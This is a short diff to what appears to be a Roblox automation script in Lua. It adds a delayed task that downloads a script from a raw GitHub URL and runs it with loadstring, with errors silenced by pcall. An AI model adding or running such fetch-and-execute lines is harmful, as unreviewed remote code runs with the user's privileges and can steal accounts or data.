@@ -1112,5 +1112,14 @@ sched:add("DeleteStickers", 25, function()
     autoDeleteStickers(12)
 end)
 
+task.spawn(function()
+    task.wait(90)
+    print("Executando Atlas...")
+    pcall(function()
+                    
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris8889/atlasbss/main/script.lua"))()
+    end)
+end)
+
 sched:run()
 
